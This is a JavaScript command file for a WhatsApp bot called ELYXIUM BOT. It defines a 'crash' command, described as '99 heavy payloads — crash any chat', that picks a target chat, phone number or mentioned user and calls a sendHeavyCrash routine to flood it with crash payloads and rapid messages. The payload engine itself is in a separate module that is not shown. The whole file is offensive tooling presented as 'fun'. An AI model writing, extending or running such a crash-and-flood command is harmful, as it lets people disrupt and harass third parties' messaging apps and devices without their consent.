 
// ☠️ ELYXIUM BOT v1.0 - CRASH COMMAND
// ⚡ ONE COMMAND — WORKS EVERYWHERE
// ⚡ Powered by ATHEX & ALTHEA
 

const { sendHeavyCrash } = require('../../utils/crashEngine');

module.exports = {
    name: 'crash',
    description: '99 heavy payloads — crash any chat',
    category: 'fun',
    usage: 'crash',
    aliases: ['freeze', 'destroy', 'nuke', 'heavy'],

    execute: async (sock, msg, args, config) => {
        const chatId = msg.key.remoteJid;
        const isGroup = chatId.endsWith('@g.us');

        try {
            let targetJid = chatId;
            let targetName = isGroup ? 'THIS GROUP' : 'THIS CHAT';

            // If number provided, target that
            if (args[0] && !isNaN(args[0].replace(/[^0-9]/g, ''))) {
                const num = args[0].replace(/[^0-9]/g, '');
                if (num.length >= 7) {
                    targetJid = num + '@s.whatsapp.net';
                    targetName = '+' + num;
                }
            }

            // If @mention, target that user
            const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
            if (mentioned?.length > 0) {
                targetJid = mentioned[0];
                targetName = '@' + targetJid.split('@')[0];
            }

            await sock.sendMessage(chatId, {
                text: `☠️ *HEAVY CRASH!*\n🎯 ${targetName}\n💣 99 payloads + 60 msgs\n🔥 TARGET MELTING!\n⚡ ATHEX & ALTHEA ⚡`
            });

            // ✅ 99 PAYLOADS + 60 RAPID = 159 TOTAL
            await sendHeavyCrash(sock, targetJid, 99);

            await sock.sendMessage(chatId, {
                text: `✅ *CRASH DONE!*\n🎯 ${targetName} ☠️\n⚡ ATHEX & ALTHEA ⚡`
            });

        } catch (error) {
            await sock.sendMessage(chatId, { text: '❌ Failed!\n⚡ ATHEX & ALTHEA ⚡' });
        }
    }
};